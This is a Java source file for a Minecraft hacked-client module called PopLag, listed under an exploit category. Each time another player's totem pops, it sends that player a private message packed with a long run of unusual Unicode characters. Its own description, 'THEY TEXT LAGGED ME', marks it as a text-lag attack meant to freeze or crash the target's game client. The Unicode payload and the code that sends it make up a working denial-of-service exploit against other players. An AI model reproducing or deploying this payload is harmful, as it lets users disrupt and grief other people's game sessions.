package me.madcat.features.modules.exploit;

import me.madcat.MadCat;
import me.madcat.features.command.Command;
import me.madcat.features.modules.Module;
import me.madcat.features.setting.Setting;
import me.madcat.util.EntityUtil;
import net.minecraft.entity.player.EntityPlayer;

public class PopLag
extends Module {
    private final Setting<Boolean> safety;
    private final Setting<Boolean> load;
    private final Setting<Boolean> friends;
    private static PopLag INSTANCE = new PopLag();
    private final Setting<Boolean> logDisable;
    private final Setting<Integer> health;
    public final Setting<String> msgString = this.register(new Setting<>("msgString", "minecraft:msg"));

    public void onTotemPop(EntityPlayer entityPlayer) {
        if (PopLag.fullNullCheck() || entityPlayer == PopLag.mc.player || this.safety.getValue() && EntityUtil.getHealth(PopLag.mc.player) <= (float) this.health.getValue() || this.friends.getValue() && MadCat.friendManager.isFriend(entityPlayer.getName()) || this.isDisabled()) {
            return;
        }
        this.sendMessage(entityPlayer.getName());
    }

    private boolean new0(Integer n) {
        return this.safety.getValue();
    }

    private void sendMessage(String string) {
        PopLag.mc.player.sendChatMessage("/" + this.msgString.getValue() + " " + string + " āȁ́Ёԁ\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁");
    }

    public PopLag() {
        super("PopLag", "THEY TEXT LAGGED ME", Module.Category.EXPLOIT);
        this.load = this.register(new Setting<>("Load", false));
        this.friends = this.register(new Setting<>("NoFriends", true));
        this.logDisable = this.register(new Setting<>("DisableOnDc", true));
        this.safety = this.register(new Setting<>("Safety", false));
        this.health = this.register(new Setting<>("StopHealth", 4, 1, 15, this::new0));
        this.setInstance();
    }

    @Override
    public void onLogout() {
        if (!mc.isSingleplayer() && this.isOn() && !PopLag.fullNullCheck() && this.logDisable.getValue()) {
            this.disable();
        }
    }

    public static PopLag INSTANCE() {
        if (INSTANCE == null) {
            INSTANCE = new PopLag();
        }
        return INSTANCE;
    }

    @Override
    public void onUpdate() {
        if (this.load.getValue()) {
            Command.sendMessage("āȁ́Ёԁ\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁");
            this.load.setValue(false);
        }
    }

    private void setInstance() {
        INSTANCE = this;
    }
}

